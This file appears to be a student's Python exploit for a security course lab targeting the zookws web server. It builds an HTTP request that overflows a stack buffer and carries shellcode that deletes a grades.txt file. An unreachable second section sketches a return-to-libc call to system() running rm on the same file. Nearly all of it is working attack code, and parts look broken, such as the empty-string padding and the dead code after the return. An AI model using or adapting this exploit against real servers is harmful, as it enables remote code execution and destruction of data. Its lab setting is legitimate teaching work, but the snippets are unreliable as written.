#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xdeadc0de
stack_saved_ebp = 0xdeadc0de
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    nop_slide = "\x90"*4
    pos_eip_shellcode_addr = "\xe0\xdd\xff\xbf"
    shellcode = "\x31\xc0\x50\x68\x2e\x74\x78\x74\x68\x61\x64\x65\x73\x68\x2f\x2f\x67\x72\x68\x74\x70\x64\x2f\x68\x65\x2f\x68\x74\x68\x2f\x68\x6f\x6d\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\x04\xff\xcd\x80"
    shellcode = nop_slide + pos_eip_shellcode_addr + shellcode
    req =  "GET%s /%s HTTP/1.0\r\n" % (''*4115, shellcode)
    req += "\r\n"
    return req

    # Part 4 Code
    nop_slide = "\x90"*4
    # system_args = "\x2f\x62\x69\x6e\x2f\x2f\x72\x6d\x00\x00\x00\x00\x2e\x74\x78\x74\x61\x64\x65\x73\x2f\x2f\x67\x72\x74\x70\x64\x2f\x65\x2f\x68\x74\x2f\x68\x6f\x6d"

    # 8 chars
    rm_string = "\x2f\x62\x69\x6e\x2f\x2f\x72\x6d"
    # 4 chars
    null_bytes = "\x00\x00\x00\x00"
    # 24 chars
    grades_string = "\x2f\x68\x6f\x6d\x65\x2f\x68\x74\x74\x70\x64\x2f\x2f\x2f\x67\x72\x61\x64\x65\x73\x2e\x74\x78\x74"
    # Total = 8 + 4 + 24 + 4 = 40
# String "/bin//rm" in hex form
# 0x6d722f2f
# 0x6e69622f

# String "/home/httpd///grades.txt" in hex form

# 0x7478742e
# 0x73656461
# 0x72672f2f
# 0x2f647074
# 0x74682f65
# 0x6d6f682f
    reserve_space = 40
    args = rm_string + null_bytes + grades_string + null_bytes + null_bytes + "aa"

    system_libc_addr = "\x10\xe3\x06\x40"
    rm_string_addr = "\xac\xdd\xfd\xbf"
    grades_string_addr = "\xb8\xdd\xfd\xbf"

    random_char = ''*( 4115 - reserve_space - 2) 
    buffer_string = random_char + args

    req =  "GET%s /%s HTTP/1.0\r\n" % (buffer_string, system_libc_addr+null_bytes+rm_string_addr+grades_string_addr)
    req += "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

